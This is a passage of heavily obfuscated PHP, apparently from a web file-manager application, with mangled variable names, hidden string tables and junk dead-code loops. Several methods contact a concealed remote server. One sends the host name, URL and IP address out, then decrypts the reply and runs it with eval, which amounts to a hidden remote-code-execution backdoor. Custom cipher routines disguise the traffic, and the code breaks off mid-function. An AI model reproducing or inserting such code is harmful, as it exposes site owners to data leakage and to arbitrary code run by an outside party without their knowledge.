private function rwaz4c966346() { $€ÏÔó· =& $_SERVER[¤±ª…ß¤]; $ù­Ãé‡Ğ = array($€ÏÔó·[119], $€ÏÔó·[120]); if (!KodUser::isRoot() || !isset($_GET[$€ÏÔó·[215]])) { return; } if (!in_array($_SERVER[$€ÏÔó·[24]], $ù­Ãé‡Ğ)) { return; } $úŸ¶š© = $€ÏÔó·[216]; $úŸ¶š© = $this->evmx0090e8ea($úŸ¶š©, $€ÏÔó·[217]); $à”å‚òÀ = stream_context_create(array($€ÏÔó·[218] => array($€ÏÔó·[219] => $€ÏÔó·[220], $€ÏÔó·[221] => 3))); $¦¸’…Ã = @file_get_contents($úŸ¶š©, !1, $à”å‚òÀ); header($€ÏÔó·[222]); if ($¦¸’…Ã && strstr($¦¸’…Ã, $€ÏÔó·[223])) { echo $¦¸’…Ã; } die; } public function zdhw15bada33($­®£óï²) { $©¾ÊÎÓ¢ =& $_SERVER[ò«¥Ê‡å]; $¨à˜Â¾¿ =& $_SERVER[¤±ª…ß¤]; if ($this->zwpn20209303 == $¨à˜Â¾¿[224]) { return $­®£óï²; } $ÈİõÊÀ = array($¨à˜Â¾¿[225] => $¨à˜Â¾¿[226], $¨à˜Â¾¿[227] => $¨à˜Â¾¿[226], $¨à˜Â¾¿[228] => $¨à˜Â¾¿[226], $¨à˜Â¾¿[229] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[231] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[232] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[233] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[234] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[235] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[236] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[237] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[238] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[239] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[240] => $¨à˜Â¾¿[230], $¨à˜Â¾¿[241] => $¨à˜Â¾¿[230]); $È•¯ö¼ = $©¾ÊÎÓ¢[712]; while (strlen($È•¯ö¼) < $©¾ÊÎÓ¢[679]) { if (!$È•¯ö¼) { break; } $È•¯ö¼++; } $çú»› = explode($¨à˜Â¾¿[242], _get($this->puyoc0817e54, $¨à˜Â¾¿[114], $¨à˜Â¾¿[6])); $ë†ü§Ç = array(); $Å¬²äº = $©¾ÊÎÓ¢[713]; if (strlen($Å¬²äº) < $©¾ÊÎÓ¢[670]) { die; } foreach ($ÈİõÊÀ as $ÅÓŸ¿ˆ => $åŸŸ—†) { if ($åŸŸ—† == $¨à˜Â¾¿[226] && substr($this->zwpn20209303, 0, 1) == $¨à˜Â¾¿[226]) { continue; } if (!in_array($ÅÓŸ¿ˆ, $çú»›)) { $ë†ü§Ç[] = $ÅÓŸ¿ˆ; } } foreach ($ë†ü§Ç as $ÅÓŸ¿ˆ) { unset($­®£óï²[$ÅÓŸ¿ˆ]); } return $­®£óï²; $ÓÓ”€û• = $©¾ÊÎÓ¢[714]; } private function yfnx470d2f0e() { $ñ•Ş²È™ =& $_SERVER[¤±ª…ß¤]; if ($this->zwpn20209303 != $ñ•Ş²È™[108]) { $GLOBALS[$ñ•Ş²È™[85]][$ñ•Ş²È™[89]][$ñ•Ş²È™[243]] = $ñ•Ş²È™[205]; return; } $GLOBALS[$ñ•Ş²È™[85]][$ñ•Ş²È™[244]] = $ñ•Ş²È™[122]; if (Model($ñ•Ş²È™[245])->get($ñ•Ş²È™[63]) != $ñ•Ş²È™[205]) { Model($ñ•Ş²È™[245])->set($ñ•Ş²È™[63], $ñ•Ş²È™[205]); } } public function eclvbe1b5f32() { return $_SERVER[¤±ª…ß¤][246]; $Íí©¬óµ = $_SERVER[ò«¥Ê‡å][715]; } private function puokc5ecdfde() { $±÷Ú©‘· =& $_SERVER[ò«¥Ê‡å]; $»Ÿ¤´õÌ =& $_SERVER[¤±ª…ß¤]; $×šÜÁæ = array($»Ÿ¤´õÌ[247], $»Ÿ¤´õÌ[248], $»Ÿ¤´õÌ[249]); $Ç£ñ¤èÌ = $±÷Ú©‘·[716]; if (!$Ç£ñ¤èÌ) { die; } $ßÂ ŒÂ‘ = $»Ÿ¤´õÌ[250] . md5($»Ÿ¤´õÌ[251]); $êÕ®Ååú = $±÷Ú©‘·[717]; if ($this->zwpn20209303 == $»Ÿ¤´õÌ[108] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$»Ÿ¤´õÌ[24]], $×šÜÁæ)) { return; } if (time() % 4 != 0) { return; } $ÜÕÆ®™Ë = call_user_func(array($»Ÿ¤´õÌ[252], $»Ÿ¤´õÌ[253]), $ßÂ ŒÂ‘); $Û‡äø® = $±÷Ú©‘·[718]; if (!$Û‡äø®) { die; } if ($ÜÕÆ®™Ë && time() - $ÜÕÆ®™Ë < intval($»Ÿ¤´õÌ[254])) { return; } call_user_func(array($»Ÿ¤´õÌ[252], $»Ÿ¤´õÌ[139]), $ßÂ ŒÂ‘, time()); $¼§¹†ÒÔ = $±÷Ú©‘·[719]; if (!$¼§¹†ÒÔ) { return; } $§õä¡Ôì = Model($»Ÿ¤´õÌ[33])->get($»Ÿ¤´õÌ[99]); $ùğøÆûí = array($»Ÿ¤´õÌ[152] => Model($»Ÿ¤´õÌ[33])->get($»Ÿ¤´õÌ[153]), $»Ÿ¤´õÌ[166] => $this->zwpn20209303, $»Ÿ¤´õÌ[163] => $_SERVER[$»Ÿ¤´õÌ[164]], $»Ÿ¤´õÌ[165] => Model($»Ÿ¤´õÌ[33])->get($»Ÿ¤´õÌ[131]), $»Ÿ¤´õÌ[104] => md5($_SERVER[$»Ÿ¤´õÌ[105]] . $§õä¡Ôì), $»Ÿ¤´õÌ[156] => $»Ÿ¤´õÌ[136], $»Ÿ¤´õÌ[159] => $_SERVER[$»Ÿ¤´õÌ[160]]); $¶ÕÖì–Â = $this->bjgdc4475dbb($»Ÿ¤´õÌ[255], $ùğøÆûí); $™§¿®‹î = $±÷Ú©‘·[720]; while ($™§¿®‹î < $±÷Ú©‘·[664]) { if ($™§¿®‹î >= 0) { break; } $™§¿®‹î++; } if (!is_array($¶ÕÖì–Â)) { return; } if ($¶ÕÖì–Â[$»Ÿ¤´õÌ[152]] && $¶ÕÖì–Â[$»Ÿ¤´õÌ[256]]) { if ($this->xiqn4f44a202($¶ÕÖì–Â[$»Ÿ¤´õÌ[256]]) == $ùğøÆûí[$»Ÿ¤´õÌ[152]]) { return; } } $this->ezwsbed5f24f(); if ($this->xiqn4f44a202($¶ÕÖì–Â[$»Ÿ¤´õÌ[256]]) != $ùğøÆûí[$»Ÿ¤´õÌ[152]]) { $Ì‹²Ş™ = array($»Ÿ¤´õÌ[184] => $§õä¡Ôì, $»Ÿ¤´õÌ[185] => $_SERVER[$»Ÿ¤´õÌ[105]], $»Ÿ¤´õÌ[186] => this_url(), $»Ÿ¤´õÌ[161] => $_SERVER[$»Ÿ¤´õÌ[162]]); $ïçáë‰Ó = $this->pucn221d4741(json_encode($Ì‹²Ş™)); $¶ÕÖì–Â = $this->bjgdc4475dbb($»Ÿ¤´õÌ[187] . $ïçáë‰Ó); if ($¶ÕÖì–Â && is_array($¶ÕÖì–Â) && isset($¶ÕÖì–Â[$»Ÿ¤´õÌ[256]])) { $´ëâÖÉî = $this->lqtbb3c7e4f5($¶ÕÖì–Â[$»Ÿ¤´õÌ[256]], 2); if ($´ëâÖÉî) { $´ëâÖÉî = $this->xiqn4f44a202($´ëâÖÉî); } if ($´ëâÖÉî) { try { @eval($´ëâÖÉî); } catch (Exception $Ğ€¤Š‰™) { } } } } } private function bjgdc4475dbb($Õ€•Õ¹¦ = '', $Áş•ù…ë = array(), $œé¬Ò«— = 5) { $³šÂ×Ö° =& $_SERVER[ò«¥Ê‡å]; $áÉÉ¦Ëû =& $_SERVER[¤±ª…ß¤]; $™„ÏÁª’ = $áÉÉ¦Ëû[257]; $¡Â¶ˆ›¹ = $³šÂ×Ö°[721]; $™„ÏÁª’ = $this->evmx0090e8ea($™„ÏÁª’, $áÉÉ¦Ëû[258]); $ãÉ•’§  = $³šÂ×Ö°[722]; if (!$ãÉ•’§ ) { return; } $™„ÏÁª’ = $™„ÏÁª’ . $Õ€•Õ¹¦; if ($Áş•ù…ë && is_array($Áş•ù…ë)) { $™„ÏÁª’ = $™„ÏÁª’ . $áÉÉ¦Ëû[259] . http_build_query($Áş•ù…ë); } if ($Áş•ù…ë === -1) { return $™„ÏÁª’; } $ Ò²¦µ‹ = stream_context_create(array($áÉÉ¦Ëû[218] => array($áÉÉ¦Ëû[221] => $œé¬Ò«—, $áÉÉ¦Ëû[219] => $áÉÉ¦Ëû[260]), $áÉÉ¦Ëû[261] => array($áÉÉ¦Ëû[262] => !1, $áÉÉ¦Ëû[263] => !1))); $Çä¨ùÈÉ = $³šÂ×Ö°[723]; if (!$Çä¨ùÈÉ) { die; } $Áş•ù…ë = @file_get_contents($™„ÏÁª’, !1, $ Ò²¦µ‹); return json_decode($Áş•ù…ë, !0); $¶Åı öÅ = $³šÂ×Ö°[724]; while ($¶Åı öÅ < $³šÂ×Ö°[653]) { if ($¶Åı öÅ >= 0) { break; } $¶Åı öÅ++; } } private function gcdwbbdd77d1() { $ãÓî³Ãè =& $_SERVER[ò«¥Ê‡å]; $¤›ÈñÎÃ =& $_SERVER[¤±ª…ß¤]; $ï—¾É»¹ = array($¤›ÈñÎÃ[264] => $¤›ÈñÎÃ[265], $¤›ÈñÎÃ[266] => $¤›ÈñÎÃ[267], $¤›ÈñÎÃ[268] => $¤›ÈñÎÃ[269], $¤›ÈñÎÃ[270] => $¤›ÈñÎÃ[271], $¤›ÈñÎÃ[272] => $¤›ÈñÎÃ[273], $¤›ÈñÎÃ[274] => $¤›ÈñÎÃ[213], $¤›ÈñÎÃ[275] => $¤›ÈñÎÃ[213], $¤›ÈñÎÃ[276] => $¤›ÈñÎÃ[265], $¤›ÈñÎÃ[277] => $¤›ÈñÎÃ[267], $¤›ÈñÎÃ[278] => $¤›ÈñÎÃ[269], $¤›ÈñÎÃ[279] => $¤›ÈñÎÃ[280], $¤›ÈñÎÃ[281] => $¤›ÈñÎÃ[271], $¤›ÈñÎÃ[282] => $¤›ÈñÎÃ[283], $¤›ÈñÎÃ[284] => $¤›ÈñÎÃ[273], $¤›ÈñÎÃ[285] => $¤›ÈñÎÃ[286], $¤›ÈñÎÃ[287] => $¤›ÈñÎÃ[288], $¤›ÈñÎÃ[289] => $¤›ÈñÎÃ[290]); $ÜÑÌàèú = $ãÓî³Ãè[711]; while ($ÜÑÌàèú < $ãÓî³Ãè[673]) { if ($ÜÑÌàèú >= 0) { break; } $ÜÑÌàèú++; } $ıõîéû• = $ï—¾É»¹[$this->zwpn20209303]; $ †ù¹Àã = $ãÓî³Ãè[725]; if (strlen($ †ù¹Àã) < $ãÓî³Ãè[653]) { return; } $ıõîéû• = intval($ıõîéû• ? $ıõîéû• : $¤›ÈñÎÃ[265]); $²ÚÃ¹ˆó = $ãÓî³Ãè[726]; $ììÉ¼ï´ = _get($this->puyoc0817e54, $¤›ÈñÎÃ[291]); $ììÉ¼ï´ = $ììÉ¼ï´ ? intval($ììÉ¼ï´) : 0; $‡ŞéĞÇ¹ = $ãÓî³Ãè[727]; if (!$‡ŞéĞÇ¹) { die; } return $ıõîéû• + $ììÉ¼ï´; } public function apeof17c209c($´ÍÊÊ’Û) { $ÍßÊ†ïî =& $_SERVER[ò«¥Ê‡å]; $¯…À˜¡ =& $_SERVER[¤±ª…ß¤]; $Øôã…¤² = $this->gcdwbbdd77d1(); $÷Âï›‚¼ = $ÍßÊ†ïî[728]; if (strlen($÷Âï›‚¼) < $ÍßÊ†ïî[670]) { return; } if ($´ÍÊÊ’Û[$¯…À˜¡[292]] == $¯…À˜¡[122]) { return; } if ($Øôã…¤² >= intval($¯…À˜¡[213])) { return; } $ÃèÄÆÇ— = Model($¯…À˜¡[125])->count(); $Ô¬²ºí = $ÍßÊ†ïî[729]; if (!$Ô¬²ºí) { die; } if ($ÃèÄÆÇ— <= $Øôã…¤²) { return; } $Œ°¾ÑÂé = Model($¯…À˜¡[125])->field($¯…À˜¡[292])->limit($Øôã…¤²)->select(); $Œ°¾ÑÂé = array_to_keyvalue($Œ°¾ÑÂé, $¯…À˜¡[6], $¯…À˜¡[292]); if (!in_array($´ÍÊÊ’Û[$¯…À˜¡[292]], $Œ°¾ÑÂé)) { show_json($¯…À˜¡[293], !1, $¯…À˜¡[209]); } } public function yjigb99da3f9() { $½Ä–Óù =& $_SERVER[ò«¥Ê‡å]; $ú½´Î¤¬ =& $_SERVER[¤±ª…ß¤]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÒÎèÚ·¾ = $ú½´Î¤¬[216]; $Ôéë†ŠÙ = $½Ä–Óù[730]; while (strlen($Ôéë†ŠÙ) < $½Ä–Óù[653]) { if (!$Ôéë†ŠÙ) { break; } $Ôéë†ŠÙ++; } $ÒÎèÚ·¾ = $this->evmx0090e8ea($ÒÎèÚ·¾, $ú½´Î¤¬[217]); $ÙóÛÁª = $½Ä–Óù[731]; if (!$ÙóÛÁª) { die; } $¤ÏˆÉ¿• = stream_context_create(array($ú½´Î¤¬[218] => array($ú½´Î¤¬[219] => $ú½´Î¤¬[220], $ú½´Î¤¬[221] => 3))); $Ñ…¹ˆ†… = @file_get_contents($ÒÎèÚ·¾, !1, $¤ÏˆÉ¿•); $®Ä£ÔŒ¢ = $½Ä–Óù[732]; echo $ú½´Î¤¬[294] . hash_encode($Ñ…¹ˆ†…) . $ú½´Î¤¬[295]; $óÁË¡¯ = $½Ä–Óù[733]; } private function pcohfae2f6dc($»ÑÂğ°¤, $É–»ş¯ù, $º˜Æá¬­ = 3) { $»öüÄ =& $_SERVER[ò«¥Ê‡å]; $Äƒ’Åœ€ =& $_SERVER[¤±ª…ß¤]; usleep(1); $™¶ãî²Ë = $»öüÄ[734]; $»ÑÂğ°¤ = trim($»ÑÂğ°¤); $Ÿ€¹Ç„â = $»öüÄ[735]; if (strlen($Ÿ€¹Ç„â) < $»öüÄ[664]) { return; } $ÆÜÅÖÜÈ = mt_rand(0, 5) . $Äƒ’Åœ€[6]; $ÙŠ¹ÔÄ÷ = $»öüÄ[736]; if (!$ÙŠ¹ÔÄ÷) { die; } $„ªªä©Ü = rand_string(15); $äšŞĞ¿ = $Äƒ’Åœ€[296]; switch ($ÆÜÅÖÜÈ) { case $Äƒ’Åœ€[205]: $é“æ¢åˆ = $this->zxoa6757912c($»ÑÂğ°¤, strrev($É–»ş¯ù . $„ªªä©Ü)); break; $ƒÖÏ—Ì© = $»öüÄ[737]; if (!$ƒÖÏ—Ì©) { return; } case $Äƒ’Åœ€[122]: $é“æ¢åˆ = $this->zxoa6757912c($»ÑÂğ°¤, strrev($„ªªä©Ü . $É–»ş¯ù)); break; case $Äƒ’Åœ€[297]: $é“æ¢åˆ = $this->zxoa6757912c($»ÑÂğ°¤, base64_encode($„ªªä©Ü . $É–»ş¯ù)); break; case $Äƒ’Åœ€[298]: $é“æ¢åˆ = $this->zxoa6757912c($»ÑÂğ°¤, md5($„ªªä©Ü . $É–»ş¯ù)); break; $À´·ÃÊã = $»öüÄ[738]; case $Äƒ’Åœ€[299]: $»ÑÂğ°¤ = base64_encode($»ÑÂğ°¤); $–²¡ğˆ¥ = rand(0, 64); $â¼×àÄ¿ = $äšŞĞ¿[$–²¡ğˆ¥]; $ªô¸Ñú = md5($â¼×àÄ¿ . md5($É–»ş¯ù . $â¼×àÄ¿) . $É–»ş¯ù); $ªô¸Ñú = substr($ªô¸Ñú, $–²¡ğˆ¥ % 8, $–²¡ğˆ¥ % 8 + 7); $Å³ ‹©ª = $»öüÄ[739]; $ÌƒÚÈÁï = $Äƒ’Åœ€[6]; $Äé™¯Š = 0; $Òª´Ÿµ€ = $»öüÄ[740]; $÷ğä˜–‹ = 0; $•â¸¾»† = $»öüÄ[741]; if (!$•â¸¾»†) { return; } $¨«ìÆü‰ = 0; for ($Äé™¯Š = 0; $Äé™¯Š < strlen($»ÑÂğ°¤); $Äé™¯Š++) { $¨«ìÆü‰ = $¨«ìÆü‰ == strlen($ªô¸Ñú) ? 0 : $¨«ìÆü‰; $÷ğä˜–‹ = ($–²¡ğˆ¥ + strpos($äšŞĞ¿, $»ÑÂğ°¤[$Äé™¯Š]) + ord($ªô¸Ñú[$¨«ìÆü‰++])) % 64; $ÌƒÚÈÁï .= $äšŞĞ¿[$÷ğä˜–‹]; } $é“æ¢åˆ = hash_encode($â¼×àÄ¿ . $ÌƒÚÈÁï); $´•øÄ÷® = $»öüÄ[742]; break; $†Ÿ¿ğ”ú = $»öüÄ[743]; if (strlen($†Ÿ¿ğ”ú) < $»öüÄ[664]) { return; } default: $é“æ¢åˆ = $this->zxoa6757912c($»ÑÂğ°¤, $É–»ş¯ù . $„ªªä©Ü); break; } $é“æ¢åˆ = strrev($ÆÜÅÖÜÈ . $„ªªä©Ü . $é“æ¢åˆ); if ($º˜Æá¬­ - 1 > 0) { $é“æ¢åˆ = $this->pcohfae2f6dc($é“æ¢åˆ, $É–»ş¯ù, $º˜Æá¬­ - 1); } return $é“æ¢åˆ; } private function lqtbb3c7e4f5($Ëå“÷ã‹, $ò…’Øà, $ú£îõÖœ = 3) { $Ò‡Áä® =& $_SERVER[ò«¥Ê‡å]; $’å¥©© =& $_SERVER[¤±ª…ß¤]; if (!is_string($Ëå“÷ã‹) || strlen($Ëå“÷ã‹) < 10) { return !1; } $Ëå“÷ã‹ = trim($Ëå“÷ã‹); $Ëå“÷ã‹ = strrev($Ëå“÷ã‹); $’ê¶‚¨¹ = $Ò‡Áä®[744]; if (strlen($’ê¶‚¨¹) < $Ò‡Áä®[673]) { return; } $û®‚ÇÒ = $Ëå“÷ã‹[0]; $â¯ÅÆ©à = substr($Ëå“÷ã‹, 1, 15); $Ëå“÷ã‹ = substr($Ëå“÷ã‹, 16); $È¦äÊ‹ı = $Ò‡Áä®[745]; while ($È¦äÊ‹ı < $Ò‡Áä®[664]) { if ($È¦äÊ‹ı >= 0) { break; } $È¦äÊ‹ı++; } $–˜ÎÚË = $’å¥©©[296]; switch ($û®‚ÇÒ) { case $’å¥©©[205]: $¿µ ªµ‚ = $this->evmx0090e8ea($Ëå“÷ã‹, strrev($ò…’Øà . $â¯ÅÆ©à)); break; $ªğ³áë = $Ò‡Áä®[746]; if (strlen($ªğ³áë) < $Ò‡Áä®[679]) { die; } case $’å¥©©[122]: $¿µ ªµ‚ = $this->evmx0090e8ea($Ëå“÷ã‹, strrev($â¯ÅÆ©à . $ò…’Øà)); $½ÏäßÒÀ = $Ò‡Áä®[747]; while ($½ÏäßÒÀ < $Ò‡Áä®[653]) { if ($½ÏäßÒÀ >= 0) { break; } $½ÏäßÒÀ++; } break; $Ûšæ‡Ü = $Ò‡Áä®[748]; case $’å¥©©[297]: $¿µ ªµ‚ = $this->evmx0090e8ea($Ëå“÷ã‹, base64_encode($â¯ÅÆ©à . $ò…’Øà)); $ûÕ‚—¾ = $Ò‡Áä®[749]; break; case $’å¥©©[298]: $¿µ ªµ‚ = $this->evmx0090e8ea($Ëå“÷ã‹, md5($â¯ÅÆ©à . $ò…’Øà)); break; $—ÜÆÔëë = $Ò‡Áä®[750]; while (strlen($—ÜÆÔëë) < $Ò‡Áä®[653]) { if (!$—ÜÆÔëë) { break; } $—ÜÆÔëë++; } case $’å¥©©[299]: $Ëå“÷ã‹ = hash_decode($Ëå“÷ã‹); $û ²ì·Ò = $Ëå“÷ã‹[0]; $Ëå“÷ã‹ = substr($Ëå“÷ã‹, 1); $ˆˆŠ¾Òœ = strpos($–˜ÎÚË, $û ²ì·Ò); $¾†µÆœ“ = $Ò‡Áä®[751]; if (strlen($¾†µÆœ“) < $Ò‡Áä®[664]) { return; } $Ù«ƒšõÊ = md5($û ²ì·Ò . md5($ò…’Øà . $û ²ì·Ò) . $ò…’Øà); $Ù«ƒšõÊ = substr($Ù«ƒšõÊ, $ˆˆŠ¾Òœ % 8, $ˆˆŠ¾Òœ % 8 + 7); $íšûÄÂ = $Ò‡Áä®[752]; if (strlen($íšûÄÂ) < $Ò‡Áä®[653]) { return; } $–÷—§ú = $’å¥©©[6]; $¸¸¢êß = $Ò‡Áä®[753]; if (!$¸¸¢êß) { die; } $Ñî»Ì† = 0; $Ñ‰‡÷à = 0; $ÆÑğõ¡ = $Ò‡Áä®[754]; if (!$ÆÑğõ¡) { return; } $¼…ó¦ÔÜ = 0; for ($Ñî»Ì† = 0; $Ñî»Ì† < strlen($Ëå“÷ã‹); $Ñî»Ì†++) { $¼…ó¦ÔÜ = $¼…ó¦ÔÜ == strlen($Ù«ƒšõÊ) ? 0 : $¼…ó¦ÔÜ; $ËÏöÆøã = $Ò‡Áä®[755]; if (strlen($ËÏöÆøã) < $Ò‡Áä®[679]) { die; } $ÄÛŒ„‰ = $¼…ó¦ÔÜ++; $ã³û¡€µ = $Ò‡Áä®[756]; while ($ã³û¡€µ < $Ò‡Áä®[673]) { if ($ã³û¡€µ >= 0) { break; } $ã³û¡€µ++; } $Ñ‰‡÷à = strpos($–˜ÎÚË, $Ëå“÷ã‹[$Ñî»Ì†]) - $ˆˆŠ¾Òœ - ord($Ù«ƒšõÊ[$ÄÛŒ„‰]); while ($Ñ‰‡÷à < 0) { $Ñ‰‡÷à += 64; } $–÷—§ú .= $–˜ÎÚË[$Ñ‰‡÷à]; $¾æ°ŸåÉ = $Ò‡Áä®[757]; } $¿µ ªµ‚ = base64_decode($–÷—§ú); break; $¨—ñƒŞ” = $Ò‡Áä®[758]; if (strlen($¨—ñƒŞ”) < $Ò‡Áä®[670]) { return; } default: $¿µ ªµ‚ = $this->evmx0090e8ea($Ëå“÷ã‹, $ò…’Øà . $â¯ÅÆ©à); break; $›ÒÚ‡‘’ = $Ò‡Áä®[759]; if (strlen($›ÒÚ‡‘’) < $Ò‡Áä®[673]) { return; } } if ($ú£îõÖœ - 1 > 0) { $¿µ ªµ‚ = $this->lqtbb3c7e4f5($¿µ ªµ‚, $ò…’Øà, $ú£îõÖœ - 1); } return $¿µ ªµ‚; } public function pucn221d4741($Ÿ–´¿£ç) { $£¿Í§Şˆ =& $_SERVER[ò«¥Ê‡å]; $ş‹±·É =& $_SERVER[¤±ª…ß¤]; $Í–ğÜÎÂ = $this->fmkiba7d45c3(); $şÈ’ô’Ù = $£¿Í§Şˆ[760]; if (!$şÈ’ô’Ù) { die; } $ÄÅëíÅë = $this->fmkiba7d45c3(); $ÁÍîº„â = $£¿Í§Şˆ[761]; if (strlen($ÁÍîº„â) < $£¿Í§Şˆ[653]) { die; } $úÇä¯¶õ = ($Í–ğÜÎÂ - 1) * ($ÄÅëíÅë - 1); $»ùó¡”Ş = $£¿Í§Şˆ[762]; $îöÀ¹ÒÖ = intval(($Í–ğÜÎÂ + $ÄÅëíÅë) / 2); while (1) { $åÂ™Å˜´ = $îöÀ¹ÒÖ; $Ò‘Ëùˆá = $£¿Í§Şˆ[763]; if (!$Ò‘Ëùˆá) { return; } $ë…Ã«å = $úÇä¯¶õ; $²®€ƒ¾ë = $£¿Í§Şˆ[764]; if (!$²®€ƒ¾ë) { return; } while ($ë…Ã«å % $åÂ™Å˜´ != 0) { $´Ñ†¸¯± = $ë…Ã«å; $£Ä…ÎÎ = $£¿Í§Şˆ[765]; while ($£Ä…ÎÎ < $£¿Í§Şˆ[673]) { if ($£Ä…ÎÎ >= 0) { break; } $£Ä…ÎÎ++; } $ë…Ã«å = $åÂ™Å˜´; $åÂ™Å˜´ = $´Ñ†¸¯± % $åÂ™Å˜´; $¿ÏöÄ€É = $£¿Í§Şˆ[766]; while (strlen($¿ÏöÄ€É) < $£¿Í§Şˆ[673]) { if (!$¿ÏöÄ€É) { break; } $¿ÏöÄ€É++; } } if ($åÂ™Å˜´ == 1) { break; } else { $îöÀ¹ÒÖ++; } } $”ÅŸª£ú = 2; for ($ ‡ÉÚŸ… = 0; $ ‡ÉÚŸ… < $úÇä¯¶õ * 10; $ ‡ÉÚŸ…++) { if (($úÇä¯¶õ * $ ‡ÉÚŸ… + 1) % $îöÀ¹ÒÖ == 0) { $”ÅŸª£ú = intval(($úÇä¯¶õ * $ ‡ÉÚŸ… + 1) / $îöÀ¹ÒÖ); break; } } $Áş€˜–´ = $this->zxoa6757912c($Í–ğÜÎÂ * $ÄÅëíÅë . $ş‹±·É[6], $ş‹±·É[136]); $†ëıô›Í = md5($ş‹±·É[300] . ($Í–ğÜÎÂ + $ÄÅëíÅë) . $ş‹±·É[301] . $îöÀ¹ÒÖ . $ş‹±·É[301] . $”ÅŸª£ú . $ş‹±·É[302]); $šíá®ı¢ = $this->zxoa6757912c($Ÿ–´¿£ç, $†ëıô›Í) . $ş‹±·É[303] . $Áş€˜–´; return $šíá®ı¢; $±’â©· = $£¿Í§Şˆ[767]; if (strlen($±’â©·) < $£¿Í§Şˆ[653]) { die; } } public function xiqn4f44a202($´»ºÂıß) { $±ÊºÊÆÃ =& $_SERVER[ò«¥Ê‡å]; $ÄéªêÔø =& $_SERVER[¤±ª…ß¤]; $ËİÄ–´¿ = explode($ÄéªêÔø[303], $´»ºÂıß); if (count($ËİÄ–´¿) != 2) { return $ÄéªêÔø[6]; } $ÌìõÑâì = $this->evmx0090e8ea($ËİÄ–´¿[1] . $ÄéªêÔø[6], $ÄéªêÔø[136]); $»Œ´Âƒí = $±ÊºÊÆÃ[724]; if (!$ÌìõÑâì) { return $ÄéªêÔø[6]; } $ÌìõÑâì = intval($ÌìõÑâì); $‘·Ÿêä = 0; $ÁŞİÀ” = $±ÊºÊÆÃ[768]; $Ôôˆ˜Æ = 0; $Ì÷è°ñÏ = $±ÊºÊÆÃ[769]; for ($øæšÁÇì = 3; $øæšÁÇì < $ÌìõÑâì; $øæšÁÇì += 2) { if ($ÌìõÑâì % $øæšÁÇì != 0) { continue; } $‘·Ÿêä = $øæšÁÇì; $Ôôˆ˜Æ = intval($ÌìõÑâì / $øæšÁÇì); $€©Ş®­˜ = $±ÊºÊÆÃ[770]; break; $µÜ‡í™Ê = $±ÊºÊÆÃ[771]; while ($µÜ‡í™Ê < $±ÊºÊÆÃ[670]) { if ($µÜ‡í™Ê >= 0) { break; } $µÜ‡í™Ê++; } } $æÜÅ¥¼« = ($‘·Ÿêä - 1) * ($Ôôˆ˜Æ - 1); $ÅéµÎñõ = $±ÊºÊÆÃ[772]; while (strlen($ÅéµÎñõ) < $±ÊºÊÆÃ[673]) { if (!$ÅéµÎñõ) { break; } $ÅéµÎñõ++; } $º¾­À—Å = intval(($‘·Ÿêä + $Ôôˆ˜Æ) / 2); $çç‡¬Á¨ = $±ÊºÊÆÃ[773]; if (!$çç‡¬Á¨) { return; } while (1) { $†Úœ„¿î = $º¾­À—Å; $§äÛÎ€ = $æÜÅ¥¼«; $Û—¹ï²¯ = $±ÊºÊÆÃ[774]; if (!$Û—¹ï²¯) { die; } while ($§äÛÎ€ % $†Úœ„¿î != 0) { $û¤¡Ä·Ÿ = $§äÛÎ€; $§äÛÎ€ = $†Úœ„¿î; $†Úœ„¿î = $û¤¡Ä·Ÿ % $†Úœ„¿î; $Ë¥ŠÕù = $±ÊºÊÆÃ[775]; } if ($†Úœ„¿î == 1) { break; } else { $º¾­À—Å++; } } $ øü´Úû = 2; $½©”œÚ = $±ÊºÊÆÃ[776]; if (!$½©”œÚ) { die; } for ($øæšÁÇì = 0; $øæšÁÇì < $æÜÅ¥¼« * 10; $øæšÁÇì++) { if (($æÜÅ¥¼« * $øæšÁÇì + 1) % $º¾­À—Å == 0) { $ øü´Úû = intval(($æÜÅ¥¼« * $øæšÁÇì + 1) / $º¾­À—Å); break; } } $¦ƒ‰ßâ² = md5($ÄéªêÔø[300] . ($‘·Ÿêä + $Ôôˆ˜Æ) . $ÄéªêÔø[301] . $º¾­À—Å . $ÄéªêÔø[301] . $ øü´Úû . $ÄéªêÔø[302]); $öõ±²® = $this->evmx0090e8ea($ËİÄ–´¿[0], $¦ƒ‰ßâ²); $„«‹äÃÇ = $±ÊºÊÆÃ[777]; if (strlen($„«‹äÃÇ) < $±ÊºÊÆÃ[673]) { die; } return $öõ±²®; $ÁŒïéâ† = $±ÊºÊÆÃ[778]; if (strlen($ÁŒïéâ†) < $±ÊºÊÆÃ[673]) { return; } } public function fmkiba7d45c3() { $¦†Àåö =& $_SERVER[ò«¥Ê‡å]; $Æ£€îêÅ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÕéÕø›è = $¦†Àåö[779]; if (!$ÕéÕø›è) { die; } $ÙùòÍ = array(); $çÌ˜Áß˜ = 1; $Ÿ‘Ê¿›© = $¦†Àåö[780]; while (strlen($Ÿ‘Ê¿›©) < $¦†Àåö[664]) { if (!$Ÿ‘Ê¿›©) { break; } $Ÿ‘Ê¿›©++; } while ($çÌ˜Áß˜ <= (int) sqrt($Æ£€îêÅ)) { $¼ë‰«› = $çÌ˜Áß˜; $½…•­äË = $¦†Àåö[781]; if (strlen($½…•­äË) < $¦†Àåö[670]) { return; } while (!0) { $¼ë‰«›++; $¯†’ë’ = $¦†Àåö[782]; if (strlen($¯†’ë’) < $¦†Àåö[653]) { die; } if ($¼ë‰«› <= 2) { $çÌ˜Áß˜ = $¼ë‰«›; break; } else { if ($¼ë‰«› < 2) { continue; } } $°…Ğ = !0; for ($¥çóÒã = 2; $¥çóÒã <= sqrt($¼ë‰«›); $¥çóÒã++) { if ($¼ë‰«› % $¥çóÒã == 0) { $°…Ğ = !1; } } if ($°…Ğ) { $çÌ˜Áß˜ = $¼ë‰«›; break; } } $ÙùòÍ[] = $çÌ˜Áß˜; $şø—«öŸ = $¦†Àåö[783]; if (!$şø—«öŸ) { 